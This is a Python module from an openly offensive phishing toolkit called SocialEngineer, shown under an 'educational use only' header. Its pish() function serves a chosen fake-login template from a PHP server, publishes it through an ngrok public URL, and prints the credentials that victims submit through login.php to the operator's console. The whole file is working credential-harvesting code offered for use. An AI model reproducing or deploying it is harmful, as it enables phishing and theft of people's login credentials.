#!/usr/bin/env python

"""
SocialEngineer - Social Engineering Toolkit
-------------------------------------------

Author      : Karthikeyan (https://karthithehacker.com)
GitHub      : https://github.com/karthi-the-hacker
Project     : SocialEngineer - An all-in-one CLI framework for social engineering

License     : Open-source — strictly for educational and ethical hacking purposes ONLY.

Note to Users:
--------------
🔐 This tool is intended solely for educational use, research, and authorized security testing.
🚫 Unauthorized use of this tool on networks you do not own or lack permission to test is illegal.
❗ If you use or modify this code, PLEASE GIVE PROPER CREDIT to the original author.

Warning to Code Thieves:
------------------------
❌ Removing this header or claiming this project as your own without credit is unethical and violates open-source principles.
🧠 Writing your own code earns respect. Copy-pasting without attribution does not.
✅ Be an ethical hacker. Respect developers' efforts and give credit where it’s due.
"""
import subprocess
from includes import utils
from rich.console import Console
from includes import dynamic_url
import threading
import os
from colorama import Fore, Style, init
init(autoreset=True)

console = Console()

def pish(selected_template):
    print(Fore.GREEN + "✅ " + Style.BRIGHT + "Selected Template: " + Fore.CYAN + f"{selected_template}" + Style.RESET_ALL)
    template_path = os.path.join("templates", selected_template)

    local_ip = utils.getip()
    ngrok_url = dynamic_url.re_url()

    print()
    print(f"{Fore.CYAN + Style.BRIGHT}[🌐 Localhost URL]{Style.RESET_ALL}   ➤  {Fore.YELLOW}http://{local_ip}/{selected_template}/")
    print(f"{Fore.GREEN + Style.BRIGHT}[🚀 Ngrok Public URL]{Style.RESET_ALL} ➤  {Fore.MAGENTA}{ngrok_url}/{selected_template}/")
    print(template_path)

    # Function to run PHP server
    def run_php():    
        php_process = subprocess.Popen(
            ["php", "-S", "0.0.0.0:80", "-t", "templates"],
            stdout=subprocess.DEVNULL,  # Suppress normal STDOUT (PHP logs)
            stderr=subprocess.PIPE,     # Capture STDERR (your table logs)
            text=True
        )

        # Print only custom table output from login.php
        try:
            for line in php_process.stderr:
                if "FIELD" in line or "+" in line or "|" in line:
                    print(line.strip())
        except KeyboardInterrupt:
            php_process.terminate()

    # Run PHP server in background thread
    server_thread = threading.Thread(target=run_php, daemon=True)
    server_thread.start()

    # Wait for user input to stop
    if input(f"{Fore.RED}⛔ Press 0 to stop the PHP server and return to menu: {Style.RESET_ALL}\n").strip() == "0":
        print(f"{Fore.YELLOW}🛑 Stopping PHP server...{Style.RESET_ALL}")
        os.system("pkill -f 'php -S'")  # Works on Unix/macOS. For Windows, use .terminate() with stored process.
